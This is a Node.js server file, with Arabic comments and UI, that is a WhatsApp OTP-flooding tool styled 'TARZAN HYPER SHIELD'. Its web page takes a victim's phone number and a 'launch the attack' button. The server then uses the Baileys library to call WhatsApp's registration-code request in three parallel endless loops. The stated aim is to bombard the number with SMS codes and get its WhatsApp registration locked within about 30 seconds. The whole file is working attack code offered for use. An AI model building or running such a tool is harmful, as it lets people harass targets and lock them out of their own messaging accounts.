/**
 * 👑 TARZAN OTP SHIELD - HYPER SPEED (FINAL VERSION) 👑
 * النسخة النهائية المجهزة للعمل على Render بدون أخطاء
 */

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    pino
} = require('@whiskeysockets/baileys');
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// إنشاء مجلد الجلسة إذا لم يكن موجوداً
const authPath = path.join(__dirname, 'session_auth');
if (!fs.existsSync(authPath)) {
    fs.mkdirSync(authPath, { recursive: true });
}

// واجهة المستخدم الرسومية
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝑻𝑨𝑹𝒁𝑨𝑵 𝑯𝒀𝑷𝑬𝑹 𝑺𝑯𝑰𝑬𝑳𝑫</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap');
        body { font-family: 'Cairo', sans-serif; background-color: #050000; color: white; }
        .neon-box { box-shadow: 0 0 20px #ff0000; border: 1px solid #ff0000; }
        .pulse { animation: pulse 1s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center">
    <div class="max-w-md w-full p-8 bg-black/80 rounded-3xl neon-box text-center space-y-6">
        <h1 class="text-4xl font-black text-red-600 italic pulse">𝑻𝑨𝑹𝒁𝑨𝑵 𝑽𝑰𝑷</h1>
        <p class="text-gray-400 text-sm">أدخل الرقم ليتم قفله في 30 ثانية</p>
        <input type="text" id="phone" placeholder="9665..." class="w-full bg-white/5 border border-red-900/50 p-4 rounded-xl text-center text-2xl tracking-widest outline-none focus:border-red-600">
        <button onclick="startAttack()" id="btn" class="w-full bg-red-600 hover:bg-red-700 py-4 rounded-xl font-bold text-xl transition-all">إطلاق الهجوم 💀</button>
        <div id="status" class="text-sm text-yellow-500 font-mono mt-4">الحالة: خامل</div>
    </div>
    <script>
        async function startAttack() {
            const num = document.getElementById('phone').value;
            if(!num) return alert('أدخل الرقم!');
            document.getElementById('btn').disabled = true;
            document.getElementById('status').innerText = 'جاري إرسال صليات OTP...';
            
            fetch('/attack', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ phone: num })
            });

            setInterval(async () => {
                const r = await fetch('/get-status');
                const d = await r.json();
                document.getElementById('status').innerText = d.msg;
            }, 2000);
        }
    </script>
</body>
</html>
    `);
});

let currentStatus = "جاهز للإطلاق";

app.post('/attack', async (req, res) => {
    const { phone } = req.body;
    res.json({ started: true });
    launch(phone);
});

app.get('/get-status', (req, res) => res.json({ msg: currentStatus }));

async function launch(phone) {
    const { state, saveCreds } = await useMultiFileAuthState(authPath);
    const sock = makeWASocket({
        auth: state,
        logger: pino({ level: 'silent' })
    });

    sock.ev.on('creds.update', saveCreds);

    const cc = phone.substring(0, 3);
    const nn = phone.substring(3);

    // هجوم مكثف بـ 3 مسارات متوازية لتحقيق القفل في 30 ثانية
    const attack = async () => {
        while(true) {
            try {
                await sock.requestRegistrationCode({
                    phoneNumber: phone,
                    phoneNumberCountryCode: cc,
                    phoneNumberNationalNumber: nn,
                    method: 'sms'
                });
                currentStatus = "✅ نبضة ناجحة.. جاري الإغراق.";
            } catch (e) {
                let wait = e.data?.value || "300";
                currentStatus = `💀 تم القفل! الخدمة معطلة لـ ${wait} ثانية`;
            }
            await new Promise(r => setTimeout(r, 1000));
        }
    };

    attack();
    attack();
    attack();
}

app.listen(PORT, '0.0.0.0', () => console.log(`Server on ${PORT}`));

// معالجة أخطاء الرندر
process.on('uncaughtException', (err) => console.log('Error:', err.message));
